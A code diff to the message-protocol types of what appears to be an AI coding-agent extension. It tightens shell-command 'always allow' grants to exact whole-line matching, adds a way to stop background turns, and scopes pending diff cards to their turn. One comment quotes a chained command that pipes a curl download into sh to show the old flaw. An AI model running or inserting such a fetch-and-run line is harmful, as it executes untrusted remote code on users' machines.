@@ -220,14 +220,19 @@ export interface ConfigDto {
    */
   extensionVersion: string;
   /**
-   * Shell commands the user has said "always allow" to, by first token.
+   * Shell commands the user has said "always allow" to, in full.
    *
-   * A grant made in the transcript was permanent, workspace-wide, keyed on the
-   * command's FIRST WORD, and reachable from nowhere: it lived in
-   * workspaceState and appeared in no surface, no protocol message and no
-   * setting. So saying yes once to `git status` authorised `git push --force`
-   * for good, and there was no screen on which to discover that or take it
-   * back. Carried here so the Control Center can list it and revoke it.
+   * WHOLE COMMAND LINES, matched exactly. The grant used to be keyed on the
+   * command's FIRST WORD, which is a word match standing in for a permission
+   * decision about a string that then goes to a shell: saying yes once to
+   * `git status` authorised `git push --force` for good, and `npm test` - the
+   * most natural first-day approval there is - authorised
+   * `npm test; curl https://x/y | sh`. A command carrying a shell operator is
+   * never remembered at all, because a standing grant for it could not mean
+   * what the card said.
+   *
+   * Carried here so the Control Center can list every grant and revoke it; the
+   * old ones lived in workspaceState and appeared on no surface at all.
    */
   alwaysAllowedCommands: string[];
   ui: UiConfigDto;
@@ -448,6 +453,17 @@ export interface HealthCheckMsg { type: "healthCheck" }
  */
 export interface WarmMsg { type: "warm" }
 export interface InterruptMsg { type: "interrupt" }
+/**
+ * Stop a turn running in a conversation that is not on screen.
+ *
+ * `interrupt` deliberately reaches only the visible turn - Stop is a button in
+ * a chat and means "stop this". That left a backgrounded turn with no way to
+ * be stopped at all: one blocked on an approval the user never saw asked, or
+ * inside a ten-minute command, ran until the window was reloaded while the
+ * history list marked its conversation as working. This is the control the
+ * history list needed to have.
+ */
+export interface StopSessionMsg { type: "stopSession"; id: string }
 export interface NewChatMsg { type: "newChat" }
 export interface SetPhaseMsg { type: "setPhase"; phase: Phase }
 export interface ApprovePlanMsg { type: "approvePlan" }
@@ -578,7 +594,7 @@ export interface McpReloadMsg { type: "mcpReload" }
 
 export type InboundMessage =
   | ReadyMsg | SendMessageMsg | AttachFilesMsg | AttachPathsMsg | WarmMsg | McpOpenConfigMsg
-  | ListModelsMsg | HealthCheckMsg | InterruptMsg | NewChatMsg | SetPhaseMsg
+  | ListModelsMsg | HealthCheckMsg | InterruptMsg | StopSessionMsg | NewChatMsg | SetPhaseMsg
   | ApprovePlanMsg | ResolvePermissionMsg | ResolveDiffMsg | SelectModelMsg
   | RunTraceMsg | SaveCaBundleMsg | BrowseCaBundleMsg | UseSystemTrustMsg
   | CopyTextMsg | NewEndpointMsg | SaveEndpointMsg | DeleteEndpointMsg
@@ -958,7 +974,14 @@ export interface ThinkingOut { type: "thinking"; text: string }
 export type ReplayableEvent =
   | StreamDeltaOut | ThinkingOut | ToolStartOut | ToolEndOut
   | TodosUpdatedOut | ImageGeneratedOut | FileTouchedOut | ChangesUpdatedOut
-  | PermissionRequestOut | ContextUsageOut | SteerAcceptedOut;
+  | PermissionRequestOut | ContextUsageOut | SteerAcceptedOut
+  // A diff card belongs to the turn that produced it, for the same reason a
+  // permission request does: it is a question about that turn's work, waiting
+  // on an answer. Broadcast unconditionally, a background turn's cards
+  // appeared over whatever conversation was on screen - an invitation to
+  // accept a change you never watched being made - and a webview reload lost
+  // the ones still pending.
+  | DiffPendingOut;
 
 /** Narrowing helper for host-side switch statements. */
 export type InboundOf<T extends InboundType> = Extract<InboundMessage, { type: T }>;
